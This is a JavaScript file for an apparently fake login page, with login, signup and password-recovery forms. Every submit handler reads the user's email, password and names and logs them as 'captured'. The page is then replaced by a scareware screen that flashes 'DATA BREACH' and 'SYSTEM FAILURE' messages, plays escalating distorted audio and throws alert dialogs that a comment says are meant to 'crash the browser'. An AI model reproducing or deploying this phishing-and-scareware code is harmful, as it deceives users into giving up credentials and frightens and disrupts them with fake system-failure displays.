document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('login-form');
    const signupLink = document.getElementById('signup-link');
    const forgotLink = document.getElementById('forgot-link');
    const signupFrame = document.getElementById('signup-frame');
    const forgotFrame = document.getElementById('forgot-frame');
    const signupForm = document.getElementById('signup-form');
    const forgotForm = document.getElementById('forgot-form');
    const closeButtons = document.querySelectorAll('.close-button');
    const cancelButtons = document.querySelectorAll('.cancel-button');
    
    // Show signup frame
    signupLink.addEventListener('click', function(event) {
        event.preventDefault();
        signupFrame.style.display = 'flex';
    });
    
    // Show forgot password frame
    forgotLink.addEventListener('click', function(event) {
        event.preventDefault();
        forgotFrame.style.display = 'flex';
    });
    
    // Close frames when clicking X buttons
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            signupFrame.style.display = 'none';
            forgotFrame.style.display = 'none';
        });
    });
    
    // Close frames when clicking cancel buttons
    cancelButtons.forEach(button => {
        button.addEventListener('click', function() {
            signupFrame.style.display = 'none';
            forgotFrame.style.display = 'none';
        });
    });
    
    // Handle signup form submission
    signupForm.addEventListener('submit', function(event) {
        event.preventDefault();
        const firstName = document.getElementById('first-name').value;
        const lastName = document.getElementById('last-name').value;
        const email = document.getElementById('signup-email').value;
        const password = document.getElementById('signup-password').value;
        
        console.log("Signup credentials captured:", firstName, lastName, email, password);
        
        // Show glitch screen
        showGlitchScreen();
    });
    
    // Handle forgot password form submission
    forgotForm.addEventListener('submit', function(event) {
        event.preventDefault();
        const recoveryEmail = document.getElementById('recovery-email').value;
        
        console.log("Recovery email captured:", recoveryEmail);
        
        // Show glitch screen
        showGlitchScreen();
    });
    
    // Handle login form submission
    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        console.log("Credentials captured:", email, password);
        
        // Show glitch screen
        showGlitchScreen();
    });
    
    function showGlitchScreen() {
        document.body.innerHTML = '<canvas id="glitchCanvas"></canvas>';
        document.body.style.margin = '0';
        document.body.style.overflow = 'hidden';
        document.body.style.background = '#000';
        
        // Initialize glitch effect
        initGlitchEffect();
    }
});

function initGlitchEffect() {
    const canvas = document.getElementById('glitchCanvas');
    const ctx = canvas.getContext('2d');
    
    // Set canvas to full window size
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    // Handle window resize
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
    
    // Variables for the glitch effect
    let frames = 0;
    let glitchIntensity = 0;
    let colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#00FFFF', '#FF00FF'];
    let messages = ["ERROR", "SYSTEM FAILURE", "FATAL ERROR", "MEMORY CORRUPT", "DATA BREACH", "SYSTEM CRASH", "ACCESS DENIED"];
    
    // Arrays to hold random shapes
    let rectangles = [];
    let texts = [];
    let scanlines = [];
    
    // Create initial random elements
    for (let i = 0; i < 50; i++) {
        rectangles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            width: Math.random() * 400,
            height: Math.random() * 200,
            color: colors[Math.floor(Math.random() * colors.length)],
            dx: (Math.random() - 0.5) * 10,
            dy: (Math.random() - 0.5) * 10,
            alpha: Math.random() * 0.7
        });
        
        texts.push({
            text: messages[Math.floor(Math.random() * messages.length)],
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            size: 20 + Math.random() * 80,
            color: colors[Math.floor(Math.random() * colors.length)],
            dx: (Math.random() - 0.5) * 15,
            dy: (Math.random() - 0.5) * 15,
            alpha: 0.8 + Math.random() * 0.2
        });
    }
    
    // Create scanlines
    for (let i = 0; i < canvas.height; i += 2) {
        scanlines.push({
            y: i,
            speed: 1 + Math.random() * 3
        });
    }
    
    // Play a high-pitched noise
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    const distortion = audioContext.createWaveShaper();
    
    function makeDistortionCurve(amount) {
        const k = typeof amount === 'number' ? amount : 50;
        const n_samples = 44100;
        const curve = new Float32Array(n_samples);
        const deg = Math.PI / 180;
        
        for (let i = 0; i < n_samples; ++i) {
            const x = i * 2 / n_samples - 1;
            curve[i] = (3 + k) * x * 20 * deg / (Math.PI + k * Math.abs(x));
        }
        return curve;
    }
    
    distortion.curve = makeDistortionCurve(400);
    distortion.oversample = '4x';
    
    oscillator.type = 'sawtooth';
    oscillator.frequency.setValueAtTime(500, audioContext.currentTime);
    gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
    
    oscillator.connect(distortion);
    distortion.connect(gainNode);
    gainNode.connect(audioContext.destination);
    oscillator.start();
    
    // For TV static noise
    const staticNode = audioContext.createBufferSource();
    const staticGain = audioContext.createGain();
    staticGain.gain.value = 0.05;
    
    const staticBuffer = audioContext.createBuffer(1, audioContext.sampleRate * 2, audioContext.sampleRate);
    const staticData = staticBuffer.getChannelData(0);
    for (let i = 0; i < staticBuffer.length; i++) {
        staticData[i] = Math.random() * 2 - 1;
    }
    
    staticNode.buffer = staticBuffer;
    staticNode.loop = true;
    staticNode.connect(staticGain);
    staticGain.connect(audioContext.destination);
    staticNode.start();
    
    // Animation loop
    function animate() {
        frames++;
        
        // Clear with random background flash
        if (Math.random() < 0.1 * glitchIntensity) {
            ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
            ctx.globalAlpha = 0.3 + Math.random() * 0.7;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.globalAlpha = 1;
        } else {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
        }
        
        // Draw rectangles
        rectangles.forEach(rect => {
            ctx.globalAlpha = rect.alpha;
            ctx.fillStyle = rect.color;
            ctx.fillRect(rect.x, rect.y, rect.width, rect.height);
            
            // Move and bounce rectangles
            rect.x += rect.dx * glitchIntensity;
            rect.y += rect.dy * glitchIntensity;
            
            // Wrap around screen
            if (rect.x > canvas.width) rect.x = -rect.width;
            if (rect.x + rect.width < 0) rect.x = canvas.width;
            if (rect.y > canvas.height) rect.y = -rect.height;
            if (rect.y + rect.height < 0) rect.y = canvas.height;
            
            // Randomly change direction, size and alpha
            if (Math.random() < 0.05 * glitchIntensity) {
                rect.dx = (Math.random() - 0.5) * 20 * glitchIntensity;
                rect.dy = (Math.random() - 0.5) * 20 * glitchIntensity;
                rect.width = Math.random() * 400;
                rect.height = Math.random() * 200;
                rect.alpha = Math.random() * 0.7;
            }
        });
        
        // Draw scanlines
        ctx.fillStyle = 'rgba(0, 0, 0, 0.3)';
        scanlines.forEach(line => {
            ctx.fillRect(0, line.y, canvas.width, 1);
            line.y += line.speed * glitchIntensity;
            if (line.y > canvas.height) line.y = 0;
        });
        
        // Draw text
        texts.forEach(text => {
            ctx.globalAlpha = text.alpha;
            ctx.font = `bold ${text.size}px Arial, sans-serif`;
            ctx.fillStyle = text.color;
            ctx.fillText(text.text, text.x, text.y);
            
            // Move text
            text.x += text.dx * glitchIntensity;
            text.y += text.dy * glitchIntensity;
            
            // Wrap around screen
            if (text.x > canvas.width) text.x = -text.size * 5;
            if (text.x + text.size * 5 < 0) text.x = canvas.width;
            if (text.y > canvas.height + text.size) text.y = -text.size;
            if (text.y + text.size < 0) text.y = canvas.height;
            
            // Randomly change direction, size and content
            if (Math.random() < 0.05 * glitchIntensity) {
                text.dx = (Math.random() - 0.5) * 25 * glitchIntensity;
                text.dy = (Math.random() - 0.5) * 25 * glitchIntensity;
                text.size = 20 + Math.random() * 100;
                text.text = messages[Math.floor(Math.random() * messages.length)];
                text.alpha = 0.8 + Math.random() * 0.2;
            }
        });
        
        // Image glitch effect - shift image data
        if (Math.random() < 0.3 * glitchIntensity) {
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            // Randomly shift pixel data
            for (let i = 0; i < data.length; i += 4) {
                const offset = Math.floor(Math.random() * 100 * glitchIntensity) * 4;
                if (i + offset < data.length) {
                    data[i] = data[i + offset];
                    data[i + 1] = data[i + offset + 1];
                    data[i + 2] = data[i + offset + 2];
                }
            }
            
            ctx.putImageData(imageData, 0, 0);
        }
        
        // RGB split effect
        if (Math.random() < 0.2 * glitchIntensity) {
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            const tempCanvas = document.createElement('canvas');
            const tempCtx = tempCanvas.getContext('2d');
            tempCanvas.width = canvas.width;
            tempCanvas.height = canvas.height;
            
            tempCtx.putImageData(imageData, 0, 0);
            
            // Draw with RGB offset
            ctx.globalCompositeOperation = 'screen';
            ctx.globalAlpha = 0.5;
            ctx.drawImage(tempCanvas, Math.random() * 10 * glitchIntensity, 0);  // Red channel
            ctx.drawImage(tempCanvas, -Math.random() * 10 * glitchIntensity, 0); // Green channel
            ctx.drawImage(tempCanvas, 0, Math.random() * 10 * glitchIntensity);  // Blue channel
            
            ctx.globalCompositeOperation = 'source-over';
            ctx.globalAlpha = 1;
        }
        
        // Increase glitch intensity over time
        if (frames % 5 === 0) {
            glitchIntensity += 0.05;
            
            // Update sound based on glitch intensity
            oscillator.frequency.setValueAtTime(500 + glitchIntensity * 500, audioContext.currentTime);
            distortion.curve = makeDistortionCurve(400 + glitchIntensity * 200);
            staticGain.gain.setValueAtTime(0.05 + glitchIntensity * 0.1, audioContext.currentTime);
            
            // Create more shapes as time goes on
            if (frames % 10 === 0 && rectangles.length < 300) {
                rectangles.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    width: Math.random() * 400,
                    height: Math.random() * 200,
                    color: colors[Math.floor(Math.random() * colors.length)],
                    dx: (Math.random() - 0.5) * 20 * glitchIntensity,
                    dy: (Math.random() - 0.5) * 20 * glitchIntensity,
                    alpha: Math.random() * 0.7
                });
                
                texts.push({
                    text: messages[Math.floor(Math.random() * messages.length)],
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    size: 20 + Math.random() * 100,
                    color: colors[Math.floor(Math.random() * colors.length)],
                    dx: (Math.random() - 0.5) * 25 * glitchIntensity,
                    dy: (Math.random() - 0.5) * 25 * glitchIntensity,
                    alpha: 0.8 + Math.random() * 0.2
                });
            }
        }
        
        // Create random alert dialogs to further crash the browser
        if (Math.random() < 0.005 * glitchIntensity && frames > 100) {
            setTimeout(() => {
                try {
                    alert("SYSTEM FAILURE: CRITICAL ERROR DETECTED");
                } catch (e) {
                    console.error("Alert failed", e);
                }
            }, 100);
        }
        
        // Draw binary code in background
        if (frames % 30 === 0 || Math.random() < 0.1 * glitchIntensity) {
            ctx.globalAlpha = 0.2;
            ctx.fillStyle = "#00FF00";
            ctx.font = "10px monospace";
            for (let i = 0; i < canvas.width; i += 20) {
                for (let j = 0; j < canvas.height; j += 15) {
                    if (Math.random() < 0.3) {
                        ctx.fillText(Math.round(Math.random()), i, j);
                    }
                }
            }
            ctx.globalAlpha = 1;
        }
        
        requestAnimationFrame(animate);
    }
    
    animate();
}